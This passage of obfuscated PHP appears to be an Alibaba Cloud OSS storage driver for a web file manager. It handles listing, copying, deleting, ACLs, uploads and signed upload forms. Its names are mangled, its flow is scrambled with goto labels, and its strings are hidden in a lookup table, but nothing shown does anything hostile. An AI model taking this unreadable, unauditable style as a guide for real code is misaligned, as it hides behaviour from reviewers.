$this->getPathOuter($Dô˜Ö¨ªëÁ); } return !1; } public function mkdir($bç´È£ ˆ«, $d‰¡π¶°¶ = REPEAT_SKIP) { if ($this->_isFolder($bç´È£ ˆ«)) { return $this->getPathOuter($bç´È£ ˆ«); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($bç´È£ ˆ«)); } catch (OSS\Core\OssException $d¢âª”·π¬) { return !1; } return $this->getPathOuter($bç´È£ ˆ«); } private function fileList($D∑Æ·≥ œ, $a‡¬∑¢‹Œ∞ = '', $fÈßÏ√∑–Ï = 0) { goto c«ΩÑâ†àá; c«ΩÑâ†àá: $Dãº•”êº€ =& $_SERVER[—Ω]; $D∑Æ·≥ œ = trim($D∑Æ·≥ œ, $Dãº•”êº€[8]); $dì¡éñâÖ∫ = empty($D∑Æ·≥ œ) ? $Dãº•”êº€[33] : $D∑Æ·≥ œ . $Dãº•”êº€[8]; goto b¢«áß“É∫; b¢«áß“É∫: $A‘¢Öˆ˘ÏÙ = $Dãº•”êº€[33]; $C€ÁÏÜ‡êÈ = 1000; $BÇ±Ñﬁñªà = $eæŸè±Àßˆ = array(); goto Bö‚‘î¢à®; Bö‚‘î¢à®: while (!0) { $fÁ´Ø¨ÍåŒ = array($Dãº•”êº€[1177] => $a‡¬∑¢‹Œ∞, $Dãº•”êº€[183] => $dì¡éñâÖ∫, $Dãº•”êº€[1178] => $C€ÁÏÜ‡êÈ, $Dãº•”êº€[1179] => $A‘¢Öˆ˘ÏÙ); try { $Cæ¨ÛÆ⁄á∑ = $this->client->listObjects($this->bucket, $fÁ´Ø¨ÍåŒ); } catch (OSS\Core\OssException $Cã≈“Ö’ ÿ) { break; } $A‘¢Öˆ˘ÏÙ = $Cæ¨ÛÆ⁄á∑->getNextMarker(); $e‘õªƒ‡≤‚ = $Cæ¨ÛÆ⁄á∑->getObjectList(); $fƒ¢ÍÊŒ›¥ = $Cæ¨ÛÆ⁄á∑->getPrefixList(); foreach ($e‘õªƒ‡≤‚ as $E¨¡âúªﬂÕ) { if ($E¨¡âúªﬂÕ->getKey() == $dì¡éñâÖ∫) { continue; } $E¶∏€Ê›ìà = $E¨¡âúªﬂÕ->getKey(); if ($fÈßÏ√∑–Ï) { $E¶∏€Ê›ìà = array($Dãº•”êº€[28] => $E¶∏€Ê›ìà, $Dãº•”êº€[77] => $E¨¡âúªﬂÕ->getSize(), $Dãº•”êº€[187] => strtotime($E¨¡âúªﬂÕ->getLastModified())); } $eæŸè±Àßˆ[] = $E¶∏€Ê›ìà; } foreach ($fƒ¢ÍÊŒ›¥ as $fûò°ñœèê) { $BÇ±Ñﬁñªà[] = $fûò°ñœèê->getPrefix(); } if ($A‘¢Öˆ˘ÏÙ === $Dãº•”êº€[33]) { break; } } return array($Dãº•”êº€[74] => $BÇ±Ñﬁñªà, $Dãº•”êº€[73] => $eæŸè±Àßˆ); goto D†¶˘Ñ≈√Á; D†¶˘Ñ≈√Á: } public function copyFile($F¶î§§’ÂÀ, $aè‰ÇÑù·î) { $Eı∂ﬂî Ñ‰ = $this->size($F¶î§§’ÂÀ); if ($Eı∂ﬂî Ñ‰ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $F¶î§§’ÂÀ, $this->bucket, $this->pathEncode($aè‰ÇÑù·î)); } catch (OSS\Core\OssException $cöÓ‰»ãüÛ) { return !1; } return !0; } return $this->multiCopyObject($F¶î§§’ÂÀ, $aè‰ÇÑù·î, $Eı∂ﬂî Ñ‰); } private function multiCopyObject($DÂ¢‚ò•Ñø, $BƒÎêÉÁÀæ, $f™¡äﬂö≤á) { $bÀ÷éâ≈≈ﬂ =& $_SERVER[—Ω]; try { goto Bêñó¶ÓåÍ; Bêñó¶ÓåÍ: $Có•ãôîîÑ = array(); if ($Eﬁ†õ‰„ıè = $this->hashMd5($DÂ¢‚ò•Ñø)) { $Có•ãôîîÑ = array(OSS\OssClient::OSS_HEADERS => array($bÀ÷éâ≈≈ﬂ[1180] => $Eﬁ†õ‰„ıè)); } $Eú ú¯π∫Ï = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($BƒÎêÉÁÀæ), $Có•ãôîîÑ); goto c√‚¿ùÍè‚; bé◊’ÇªÉ∫: $cÎ™‹ªÃêí = array(); foreach ($B‚‰ôáëÒ≈ as $e‚§àÏß¡Æ => $CÉÖØﬂâûÃ) { $cÎ™‹ªÃêí[] = array($bÀ÷éâ≈≈ﬂ[1184] => $e‚§àÏß¡Æ + 1, $bÀ÷éâ≈≈ﬂ[1185] => $CÉÖØﬂâûÃ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($BƒÎêÉÁÀæ), $Eú ú¯π∫Ï, $cÎ™‹ªÃêí); goto Bå˘Õ∞éó; eûﬂ±ëºóñ: $F∞ã®±ÒÙÇ = $this->osChunkSize(); $C†ïöÆ¡â— = $this->client->generateMultiuploadParts($f™¡äﬂö≤á, $F∞ã®±ÒÙÇ); foreach ($C†ïöÆ¡â— as $e‚§àÏß¡Æ => $eôéÌÿáÒ€) { $f≈‚Ë¥¡èÓ = $EÖ¨ÜÑ∂Ÿ≈ + (int) $eôéÌÿáÒ€[$bÀ÷éâ≈≈ﬂ[1181]]; $dêÁﬁèî›± = (int) $eôéÌÿáÒ€[$bÀ÷éâ≈≈ﬂ[322]] + $f≈‚Ë¥¡èÓ - 1; $fçÂ£è◊·Ô = array($bÀ÷éâ≈≈ﬂ[1182] => $f≈‚Ë¥¡èÓ, $bÀ÷éâ≈≈ﬂ[1183] => $dêÁﬁèî›±); $B‚‰ôáëÒ≈[] = $this->client->uploadPartCopy($this->bucket, $DÂ¢‚ò•Ñø, $this->bucket, $this->pathEncode($BƒÎêÉÁÀæ), $AÏœü„·ı€, $Eú ú¯π∫Ï, $fçÂ£è◊·Ô); $AÏœü„·ı€ = $AÏœü„·ı€ + 1; } goto bé◊’ÇªÉ∫; c√‚¿ùÍè‚: $AÏœü„·ı€ = 1; $EÖ¨ÜÑ∂Ÿ≈ = 0; $B‚‰ôáëÒ≈ = array(); goto eûﬂ±ëºóñ; Bå˘Õ∞éó: } catch (OSS\Core\OssException $Eˆ®†„ƒ†ö) { return !1; } return !0; } public function moveFile($eÉæßúñŸÿ, $aê•ñé¶ùæ) { if ($this->copyFile($eÉæßúñŸÿ, $aê•ñé¶ùæ)) { $this->remove($eÉæßúñŸÿ); return !0; } return !1; } public function delFile($cπì¶›èäª) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($cπì¶›èäª)); } catch (OSS\Core\OssException $A‘ûó≠ÔÖÏ) { return !1; } return !0; } public function delFolder($C∞»»ë˘Ûê) { $E’âè…§ûÜ =& $_SERVER[—Ω]; $dπÕÊŒÇø≈ = $this->fileList($C∞»»ë˘Ûê); if (!empty($C∞»»ë˘Ûê) && !in_array(trim($C∞»»ë˘Ûê, $E’âè…§ûÜ[8]) . $E’âè…§ûÜ[8], $dπÕÊŒÇø≈[$E’âè…§ûÜ[73]])) { $dπÕÊŒÇø≈[$E’âè…§ûÜ[73]][] = trim($C∞»»ë˘Ûê, $E’âè…§ûÜ[8]) . $E’âè…§ûÜ[8]; } foreach (array_chunk($dπÕÊŒÇø≈[$E’âè…§ûÜ[73]], 1000) as $fá§ùº•œ©) { try { $this->client->deleteObjects($this->bucket, $fá§ùº•œ©); } catch (OSS\Core\OssException $Dÿ®ñÚ≠‰æ) { continue; } } return !0; } public function rename($fÿÙéÊ⁄åé, $dÍˆÏ‚ìö…) { return $this->renameObject($fÿÙéÊ⁄åé, $dÍˆÏ‚ìö…); } private function fileInfo($C±åæÆÿ , $a°¡≥Ú¡Õ› = array()) { goto e∫èæÛÿﬂÁ; A¨ìõãﬂÖ†: if (isset($a°¡≥Ú¡Õ›[$fÉ≥™øÊ≤„[77]])) { $c¡∂âÙ“éñ[$fÉ≥™øÊ≤„[77]] = $a°¡≥Ú¡Õ›[$fÉ≥™øÊ≤„[77]]; } if (isset($a°¡≥Ú¡Õ›[$fÉ≥™øÊ≤„[107]])) { $c¡∂âÙ“éñ[$fÉ≥™øÊ≤„[107]] = $a°¡≥Ú¡Õ›[$fÉ≥™øÊ≤„[107]]; } if (isset($a°¡≥Ú¡Õ›[$fÉ≥™øÊ≤„[187]]) && !trim($c¡∂âÙ“éñ[$fÉ≥™øÊ≤„[107]])) { $c¡∂âÙ“éñ[$fÉ≥™øÊ≤„[107]] = $a°¡≥Ú¡Õ›[$fÉ≥™øÊ≤„[187]]; } goto dÌàöû£øπ; e∫èæÛÿﬂÁ: $fÉ≥™øÊ≤„ =& $_SERVER[—Ω]; $c¡∂âÙ“éñ = array($fÉ≥™øÊ≤„[28] => $this->pathThis($C±åæÆÿ ), $fÉ≥™øÊ≤„[75] => $this->getPathOuter($C±åæÆÿ ), $fÉ≥™øÊ≤„[29] => $fÉ≥™øÊ≤„[164], $fÉ≥™øÊ≤„[184] => 0, $fÉ≥™øÊ≤„[107] => 0, $fÉ≥™øÊ≤„[77] => 0, $fÉ≥™øÊ≤„[157] => $this->ext($C±åæÆÿ ), $fÉ≥™øÊ≤„[185] => !0, $fÉ≥™øÊ≤„[186] => !0); if (empty($a°¡≥Ú¡Õ›)) { $CÒ˘öùº¶ñ = $this->objectMeta($C±åæÆÿ ); if (!$CÒ˘öùº¶ñ) { return $c¡∂âÙ“éñ; } $a°¡≥Ú¡Õ› = array($fÉ≥™øÊ≤„[107] => strtotime($CÒ˘öùº¶ñ[$fÉ≥™øÊ≤„[1186]]), $fÉ≥™øÊ≤„[77] => $CÒ˘öùº¶ñ[$fÉ≥™øÊ≤„[1187]] + 0); } goto A¨ìõãﬂÖ†; dÌàöû£øπ: return $c¡∂âÙ“éñ; goto E…ëÒê¬¢¿; E…ëÒê¬¢¿: } private function folderInfo($e±õáåÉ˘Ù, $c¿Ñ∆âäåÊ = array()) { $D˘µÕ’¬⁄Û =& $_SERVER[—Ω]; $C…Éêïá≈á = array($D˘µÕ’¬⁄Û[28] => $this->pathThis($e±õáåÉ˘Ù), $D˘µÕ’¬⁄Û[75] => $this->getPathOuter($D˘µÕ’¬⁄Û[8] . $e±õáåÉ˘Ù), $D˘µÕ’¬⁄Û[29] => $D˘µÕ’¬⁄Û[76], $D˘µÕ’¬⁄Û[184] => 0, $D˘µÕ’¬⁄Û[107] => 0, $D˘µÕ’¬⁄Û[185] => !0, $D˘µÕ’¬⁄Û[186] => !0); if (empty($c¿Ñ∆âäåÊ)) { $e±õáåÉ˘Ù = rtrim($e±õáåÉ˘Ù, $D˘µÕ’¬⁄Û[8]) . $D˘µÕ’¬⁄Û[8]; $C¡∫„™«Ñã = $this->objectMeta($e±õáåÉ˘Ù); if (!$C¡∫„™«Ñã) { return $C…Éêïá≈á; } $c¿Ñ∆âäåÊ = array($D˘µÕ’¬⁄Û[184] => $C¡∫„™«Ñã[$D˘µÕ’¬⁄Û[1188]][$D˘µÕ’¬⁄Û[1189]], $D˘µÕ’¬⁄Û[107] => strtotime($C¡∫„™«Ñã[$D˘µÕ’¬⁄Û[1186]])); } if (isset($c¿Ñ∆âäåÊ[$D˘µÕ’¬⁄Û[107]])) { $C…Éêïá≈á[$D˘µÕ’¬⁄Û[107]] = $c¿Ñ∆âäåÊ[$D˘µÕ’¬⁄Û[107]]; } if (isset($c¿Ñ∆âäåÊ[$D˘µÕ’¬⁄Û[184]])) { $C…Éêïá≈á[$D˘µÕ’¬⁄Û[184]] = $c¿Ñ∆âäåÊ[$D˘µÕ’¬⁄Û[184]]; } return $C…Éêïá≈á; } public function listPath($D•ŒÙèë‚ç, $DÃÀÎ•∫Ó° = false) { $dêÀñ•ıÖ› =& $_SERVER[—Ω]; $f°äÑÆùû‘ = $this->fileList($D•ŒÙèë‚ç, $dêÀñ•ıÖ›[8], !0); foreach ($f°äÑÆùû‘[$dêÀñ•ıÖ›[74]] as $FÖ”◊ü…¶ß => $C¯—ñó•†√) { $f°äÑÆùû‘[$dêÀñ•ıÖ›[74]][$FÖ”◊ü…¶ß] = $this->folderInfo($C¯—ñó•†√, $C¯—ñó•†√); } foreach ($f°äÑÆùû‘[$dêÀñ•ıÖ›[73]] as $FÖ”◊ü…¶ß => $C¯—ñó•†√) { $f°äÑÆùû‘[$dêÀñ•ıÖ›[73]][$FÖ”◊ü…¶ß] = $this->fileInfo($C¯—ñó•†√[$dêÀñ•ıÖ›[28]], $C¯—ñó•†√); } return $f°äÑÆùû‘; } public function has($CåŸÒÕù†≤, $BÒƒÖä˜’¬ = false, $B–—ÍµÖâå = true) { goto D˜∆ıÎ√Ñÿ; BîéΩÇ¯òõ: return !1; goto a£«ÒëÙ≥Œ; d∏‚ØÜà∑: $D´¨å˜¶Ÿ∂ = 0; while (!0) { $aﬂŸ«¥É√¶ = array($c†Ñˆ¬≤ ⁄[1177] => $c†Ñˆ¬≤ ⁄[8], $c†Ñˆ¬≤ ⁄[183] => $A°Ú£ƒ≈Ã¥, $c†Ñˆ¬≤ ⁄[1178] => $f€ëëÓâÉî, $c†Ñˆ¬≤ ⁄[1179] => $aáµ∫„„‘å); try { $eîôÒ«ÒÓû = $this->client->listObjects($this->bucket, $aﬂŸ«¥É√¶); } catch (OSS\Core\OssException $B‚…≤ã‡ÑÓ) { break; } $aáµ∫„„‘å = $eîôÒ«ÒÓû->getNextMarker(); $Aµ¡ù®àÈò = $eîôÒ«ÒÓû->getObjectList(); $A‘ıÒ‡Êõâ = $eîôÒ«ÒÓû->getPrefixList(); if ($BÒƒÖä˜’¬) { if (count($Aµ¡ù®àÈò) > 1 || count($Aµ¡ù®àÈò) == 1 && $Aµ¡ù®àÈò[0]->getKey() != $A°Ú£ƒ≈Ã¥) { $aÑÑƒ¬âÌœ += count($Aµ¡ù®àÈò) - 1; } if (!empty($A‘ıÒ‡Êõâ)) { $D´¨å˜¶Ÿ∂ += count($A‘ıÒ‡Êõâ); } if ($aáµ∫„„‘å === $c†Ñˆ¬≤ ⁄[33]) { break; } continue; } if ($B–—ÍµÖâå) { if (!empty($Aµ¡ù®àÈò)) { if (count($Aµ¡ù®àÈò) > 1 || $Aµ¡ù®àÈò[0]->getKey() != $A°Ú£ƒ≈Ã¥) { return !0; } } } else { if (!empty($A‘ıÒ‡Êõâ)) { return !0; } } if ($aáµ∫„„‘å === $c†Ñˆ¬≤ ⁄[33]) { break; } } if ($BÒƒÖä˜’¬) { return array($c†Ñˆ¬≤ ⁄[188] => $aÑÑƒ¬âÌœ, $c†Ñˆ¬≤ ⁄[189] => $D´¨å˜¶Ÿ∂); } goto BîéΩÇ¯òõ; E±Ø§‹ÀçÛ: $aáµ∫„„‘å = $c†Ñˆ¬≤ ⁄[33]; $f€ëëÓâÉî = 500; $aÑÑƒ¬âÌœ = 0; goto d∏‚ØÜà∑; D˜∆ıÎ√Ñÿ: $c†Ñˆ¬≤ ⁄ =& $_SERVER[—Ω]; $CåŸÒÕù†≤ = trim($CåŸÒÕù†≤, $c†Ñˆ¬≤ ⁄[8]); $A°Ú£ƒ≈Ã¥ = empty($CåŸÒÕù†≤) ? $c†Ñˆ¬≤ ⁄[33] : $CåŸÒÕù†≤ . $c†Ñˆ¬≤ ⁄[8]; goto E±Ø§‹ÀçÛ; a£«ÒëÙ≥Œ: } public function listAll($Dàèı®áª©) { $FÉéÊ‘è√é =& $_SERVER[—Ω]; $c–ÍÓÓ…√™ = $this->fileList($Dàèı®áª©, $FÉéÊ‘è√é[33], !0); $déŒåë◊à = array(); foreach ($c–ÍÓÓ…√™[$FÉéÊ‘è√é[73]] as $dÒêÉî“∏Ã) { $déŒåë◊à[$dÒêÉî“∏Ã[$FÉéÊ‘è√é[28]]] = $dÒêÉî“∏Ã[$FÉéÊ‘è√é[77]]; } return $this->listAllFiles($Dàèı®áª©, array_keys($déŒåë◊à), $déŒåë◊à); } public function canRead($F◊àÇôÊÜ˘) { $d…‘â€»≈ë =& $_SERVER[—Ω]; $Eà≠‰⁄ìŸÚ = $this->pathAcl($F◊àÇôÊÜ˘); return $Eà≠‰⁄ìŸÚ == $d…‘â€»≈ë[1190] || $Eà≠‰⁄ìŸÚ == $d…‘â€»≈ë[487] ? !0 : !1; } public function canWrite($F∆¢∞Ëœ¥›) { $eÉúù˜ôœ— = $this->pathAcl($F∆¢∞Ëœ¥›); return $eÉúù˜ôœ— == $_SERVER[—Ω][487] ? !0 : !1; } public function pathAcl($f “ØÉª”–) { goto b§‡í”´ÿ®; D∞“Ç˜âÒÒ: return $d≥ÿ∏ˆµŸç; goto DÀÌÿÿ” à; déÈ¯¡¬¡Æ: $d≥ÿ∏ˆµŸç = $cÑø£ºÎœ == $Cﬁí »õ»»[34] ? $this->bucketAcl : $cÑø£ºÎœ; if ($d≥ÿ∏ˆµŸç == $Cﬁí »õ»»[1191]) { return $Cﬁí »õ»»[1190]; } if ($d≥ÿ∏ˆµŸç == $Cﬁí »õ»»[1192]) { return $Cﬁí »õ»»[487]; } goto D∞“Ç˜âÒÒ; b§‡í”´ÿ®: $Cﬁí »õ»» =& $_SERVER[—Ω]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $cÑø£ºÎœ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($f “ØÉª”–)); } catch (OSS\Core\OssException $eﬁ≈”íÕîØ) { return !1; } goto déÈ¯¡¬¡Æ; DÀÌÿÿ” à: } private function chmodPath($Aâ¨á—Ùéå, $A«≥µπú»À = '') { $C©‚ÜÜ‘…£ =& $_SERVER[—Ω]; $Aï©¿∑˜„Í = empty($A«≥µπú»À) ? $C©‚ÜÜ‘…£[1192] : $A«≥µπú»À; $C·ÜíÇÃﬁí = array($C©‚ÜÜ‘…£[34], $C©‚ÜÜ‘…£[182], $C©‚ÜÜ‘…£[1191], $C©‚ÜÜ‘…£[1192]); if (!in_array($Aï©¿∑˜„Í, $C·ÜíÇÃﬁí)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Aâ¨á—Ùéå), $Aï©¿∑˜„Í); } catch (OSS\Core\OssException $cÚ€å£®∏ñ) { return !1; } return !0; } public function getContent($EƒÖà„≥¿Í) { return $this->fileSubstr($EƒÖà„≥¿Í, -1); } public function setContent($c…ƒµ’±¿π, $fŸ¿Ãü∞†Ó = '') { $c‰â≤¶ﬁùä =& $_SERVER[—Ω]; try { $AÑ∂ ·Ëóﬂ = $this->trafficLimit($c‰â≤¶ﬁùä[1193]); $A¶å˘Í”“Œ = $this->client->putObject($this->bucket, $this->pathEncode($c…ƒµ’±¿π), $fŸ¿Ãü∞†Ó, $AÑ∂ ·Ëóﬂ); } catch (OSS\Core\OssException $Aé›’…º‚®) { return !1; } $d¯áë¶ûÛ = array($c‰â≤¶ﬁùä[1180] => trim($A¶å˘Í”“Œ[$c‰â≤¶ﬁùä[1194]], $c‰â≤¶ﬁùä[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($c…ƒµ’±¿π))); $this->updateObjMeta($c…ƒµ’±¿π, $d¯áë¶ûÛ); return isset($A¶å˘Í”“Œ[$c‰â≤¶ﬁùä[1195]][$c‰â≤¶ﬁùä[1142]]) ? (int) $A¶å˘Í”“Œ[$c‰â≤¶ﬁùä[1195]][$c‰â≤¶ﬁùä[1142]] : strlen($A¶å˘Í”“Œ); } private function updateObjMeta($eÆíä“Ü£Ç, $d‰∏ïÆÖ‹∞) { $eÆíä“Ü£Ç = $this->pathEncode($eÆíä“Ü£Ç); try { $d€â…—¥êÚ = array(OSS\OssClient::OSS_HEADERS => $d‰∏ïÆÖ‹∞); $this->client->copyObject($this->bucket, $eÆíä“Ü£Ç, $this->bucket, $eÆíä“Ü£Ç, $d€â…—¥êÚ); } catch (OSS\Core\OssException $a‹Ìƒ§‹›±) { return !1; } return !0; } public function upload($A´ÁâÁ¨ËÉ, $D‚ô–¶Áì÷, $dÑ¢§∫Â∞á = false, $aÁâ…£ñÑ⁄ = REPEAT_REPLACE) { $EÊ¶âπï”™ =& $_SERVER[—Ω]; $e´¬“±ﬂ«∆ = trim($A´ÁâÁ¨ËÉ, $EÊ¶âπï”™[8]); $C€≥˜“÷©Ü = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($EÊ¶âπï”™[1180] => @md5_file($D‚ô–¶Áì÷)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A´ÁâÁ¨ËÉ))); $C€≥˜“÷©Ü = $this->trafficLimit($EÊ¶âπï”™[1193], $C€≥˜“÷©Ü); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($e´¬“±ﬂ«∆), $D‚ô–¶Áì÷, $C€≥˜“÷©Ü); } catch (OSS\Core\OssException $Aê≤ŸÕé◊) { return !1; } return $this->getPathOuter($A´ÁâÁ¨ËÉ); } public function getHost() { $f±¿πêíÓÛ =& $_SERVER[—Ω]; $bÓ≤ë‰Ãì≥ = explode($f±¿πêíÓÛ[168], parent::getHost()); return $bÓ≤ë‰Ãì≥[0] . $f±¿πêíÓÛ[168] . $this->bucket . $f±¿πêíÓÛ[93] . $bÓ≤ë‰Ãì≥[1]; } public function uploadFormData($cÌúá’Û©£, $C·Ó¡†¢µ· = 3600) { goto eìõÏôÇ’ù; EÖÉ∆ﬂ¥â: $bùª•¡øâ† = $this->pathFather($cÌúá’Û©£); $eê…¯«ﬂü¯ = array($Cçç“‡Ôƒﬁ[1099] => $dÿ◊ßòèÈé, $Cçç“‡Ôƒﬁ[1100] => array(array($Cçç“‡Ôƒﬁ[1198], 0, $Cﬁ°âü≥ÙÜ), array($Cçç“‡Ôƒﬁ[1103], $Cçç“‡Ôƒﬁ[1104], $bùª•¡øâ†))); $F¥Üƒ…‰‡ = base64_encode(json_encode($eê…¯«ﬂü¯)); goto d·ªâﬂ∑à; aúÒ˜◊∂◊ì: $BÃÂ’Ê£ç¡ = date($Cçç“‡Ôƒﬁ[1196], time() + $CÖº¶ô„Î–); $a˘È≤ﬂ∂ıæ = new DateTime($BÃÂ’Ê£ç¡); $dÿ◊ßòèÈé = $a˘È≤ﬂ∂ıæ->format(DateTime::ISO8601); goto cÕïà∞∑®´; eìõÏôÇ’ù: $Cçç“‡Ôƒﬁ =& $_SERVER[—Ω]; if (!($Cëßå¨êÙÛ = $this->getHost())) { return !1; } $CÖº¶ô„Î– = $C·Ó¡†¢µ·; goto aúÒ˜◊∂◊ì; d·ªâﬂ∑à: $Fá‡ÒÇ◊âû = base64_encode(hash_hmac($Cçç“‡Ôƒﬁ[215], $F¥Üƒ…‰‡, $this->secret, !0)); $bÿûﬁèîø⁄ = array($Cçç“‡Ôƒﬁ[1109] => $F¥Üƒ…‰‡, $Cçç“‡Ôƒﬁ[1199] => $this->accessKey, $Cçç“‡Ôƒﬁ[1105] => $Cçç“‡Ôƒﬁ[1097], $Cçç“‡Ôƒﬁ[1200] => $Fá‡ÒÇ◊âû, $Cçç“‡Ôƒﬁ[166] => $Cëßå¨êÙÛ); $bÿûﬁèîø⁄ = $this->trafficLimit($Cçç“‡Ôƒﬁ[1193], $bÿûﬁèîø⁄); goto c…§Ñ«Œ«Ï; cÕïà∞∑®´: $fÈãΩãáªÙ = strpos($dÿ◊ßòèÈé, $Cçç“‡Ôƒﬁ[281]); $dÿ◊ßòèÈé = substr($dÿ◊ßòèÈé, 0, $fÈãΩãáªÙ) . $Cçç“‡Ôƒﬁ[1197]; $Cﬁ°âü≥ÙÜ = 1048576000 * 5; goto EÖÉ∆ﬂ¥â; c…§Ñ«Œ«Ï: return $bÿûﬁèîø⁄; goto fﬂ±êÏ∂í®; fﬂ±êÏ∂í®: } public function multiUploadFormData($Cß¶µÈ£ôâ, $aÛˆÎãÃà“ = 3600) { $BŸ„É¶ıªÃ =& $_SERVER[—Ω]; if (!($eç¯Ø® ìÇ = $this->getHost())) { return !1; } $D¢°‰§’ÙÙ = $this->trafficLimit($BŸ„É¶ıªÃ[1193]); $Búâ¡ıã¥… = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Cß¶µÈ£ôâ), $D¢°‰§’ÙÙ); return array($BŸ„É¶ıªÃ[206] => $Búâ¡ıã¥…, $BŸ„É¶ıªÃ[166] => $eç¯Ø® ìÇ . $BŸ„É¶ıªÃ[8] . $this->pathEncode($Cß¶µÈ£ôâ), $BŸ„É¶ıªÃ[207] => gmdate($BŸ„É¶ıªÃ[1201]), $BŸ„É¶ıªÃ[89] => $Cß¶µÈ£ôâ); } public function multiUploadAuthData($Eòä’èÖÙì, $bΩÜÂ¯óÊÇ = array()) { goto c”˘…ƒÉµ…; DÎàóÀ„óº: $Dåûáú≈§ë = $CÓèìÔàœ[1204] . $this->accessKey . $CÓèìÔàœ[4] . $f†ıôüü∞»; if (strpos($cÁ‹¢Áç©Ø, $CÓèìÔàœ[210]) === 0) { $Dåûáú≈§ë = array($CÓèìÔàœ[217] => $Dåûáú≈§ë, $CÓèìÔàœ[207] => $E™åæÑ≈â∞); if ($B» ±à¿é–) { $Dåûáú≈§ë = array_merge($Dåûáú≈§ë, $B» ±à¿é–); } } return $Dåûáú≈§ë; goto A“¥àò§ó¡; Dà∏‡µã˜ﬂ: $C∫îÃƒçññ = $Eòä’èÖÙì; if (isset($bΩÜÂ¯óÊÇ[$CÓèìÔàœ[89]])) { $C∫îÃƒçññ = $bΩÜÂ¯óÊÇ[$CÓèìÔàœ[89]]; unset($bΩÜÂ¯óÊÇ[$CÓèìÔàœ[89]]); } if (isset($bΩÜÂ¯óÊÇ[$CÓèìÔàœ[208]])) { $bΩÜÂ¯óÊÇ[$CÓèìÔàœ[207]] = $E™åæÑ≈â∞; return $this->listUploadParts($C∫îÃƒçññ, $bΩÜÂ¯óÊÇ); } goto cãÒËáÇ∞ñ; c”˘…ƒÉµ…: $CÓèìÔàœ =& $_SERVER[—Ω]; $E™åæÑ≈â∞ = isset($bΩÜÂ¯óÊÇ[$CÓèìÔàœ[207]]) ? $bΩÜÂ¯óÊÇ[$CÓèìÔàœ[207]] : gmdate($CÓèìÔàœ[1201]); $cÁ‹¢Áç©Ø = isset($bΩÜÂ¯óÊÇ[$CÓèìÔàœ[157]]) ? $bΩÜÂ¯óÊÇ[$CÓèìÔàœ[157]] : $CÓèìÔàœ[33]; goto Dà∏‡µã˜ﬂ; cãÒËáÇ∞ñ: $aò†ú∞ﬂ¥§ = array($CÓèìÔàœ[209], $CÓèìÔàœ[33], $CÓèìÔàœ[116], $E™åæÑ≈â∞, "\x78\55\157\163\163\x2d\144\x61\164\x65\x3a{$E™åæÑ≈â∞}", $CÓèìÔàœ[8] . $this->bucket . $CÓèìÔàœ[8] . $C∫îÃƒçññ . $cÁ‹¢Áç©Ø); if (strpos($cÁ‹¢Áç©Ø, $CÓèìÔàœ[210]) === 0) { $aò†ú∞ﬂ¥§[0] = $CÓèìÔàœ[211]; if ($B» ±à¿é– = $this->trafficLimit($CÓèìÔàœ[1193])) { $C∫îÃƒçññ = $CÓèìÔàœ[1202]; array_splice($aò†ú∞ﬂ¥§, 5, 0, $C∫îÃƒçññ . $CÓèìÔàœ[4] . $B» ±à¿é–[$C∫îÃƒçññ]); } } if (isset($bΩÜÂ¯óÊÇ[$CÓèìÔàœ[212]]) && $bΩÜÂ¯óÊÇ[$CÓèìÔàœ[212]] == $CÓèìÔàœ[213]) { $aò†ú∞ﬂ¥§[0] = $CÓèìÔàœ[213]; } goto E≠Œ◊—ﬁ≤˘; E≠Œ◊—ﬁ≤˘: if (!empty($bΩÜÂ¯óÊÇ[$CÓèìÔàœ[1203]])) { $BÈ›õ¨Ωï¬ = array_merge(array($aò†ú∞ﬂ¥§[4]), $bΩÜÂ¯óÊÇ[$CÓèìÔàœ[1203]]); sort($BÈ›õ¨Ωï¬); $aò†ú∞ﬂ¥§[4] = implode($CÓèìÔàœ[214], $BÈ›õ¨Ωï¬); } $e—ÓÀÉ‹⁄Œ = implode($CÓèìÔàœ[214], $aò†ú∞ﬂ¥§); $f†ıôüü∞» = base64_encode(hash_hmac($CÓèìÔàœ[215], $e—ÓÀÉ‹⁄Œ, $this->secret, !0)); goto DÎàóÀ„óº; A“¥àò§ó¡: } public function listUploadParts($BÌ§›…Ñ±Ö, $eÌ£Ü»€¶ù) { goto BªÆÁ≤Àíµ; BÀ‡öæﬁìâ: return array($Bù©óÎÂ»“[217] => $dœüπ∞¿Û“, $Bù©óÎÂ»“[207] => $eÌ£Ü»€¶ù[$Bù©óÎÂ»“[207]], $Bù©óÎÂ»“[219] => $bË‡ï¶úâê); goto d—©ﬂîí´°; BªÆÁ≤Àíµ: $Bù©óÎÂ»“ =& $_SERVER[—Ω]; $CﬁÖÈÊ‘ù∑ = parse_url_query($eÌ£Ü»€¶ù[$Bù©óÎÂ»“[157]]); $BöôÛö‹“∆ = $this->client->listParts($this->bucket, $this->pathEncode($BÌ§›…Ñ±Ö), $CﬁÖÈÊ‘ù∑[$Bù©óÎÂ»“[206]]); goto dæ”ƒ¨¥ﬁü; Fæ≥Œ∫Û’“: unset($eÌ£Ü»€¶ù[$Bù©óÎÂ»“[208]], $eÌ£Ü»€¶ù[$Bù©óÎÂ»“[212]]); $dœüπ∞¿Û“ = $this->multiUploadAuthData($BÌ§›…Ñ±Ö, $eÌ£Ü»€¶ù); if (empty($dœüπ∞¿Û“)) { return !1; } goto BÀ‡öæﬁìâ; dæ”ƒ¨¥ﬁü: $f¶ã√∏íé› = $BöôÛö‹“∆->getListPart(); $bË‡ï¶úâê = array(); foreach ($f¶ã√∏íé› as $A·áàÓ¿ô—) { $bË‡ï¶úâê[] = array($Bù©óÎÂ»“[1184] => $A·áàÓ¿ô—->getPartNumber(), $Bù©óÎÂ»“[1185] => trim($A·áàÓ¿ô—->getETag(), 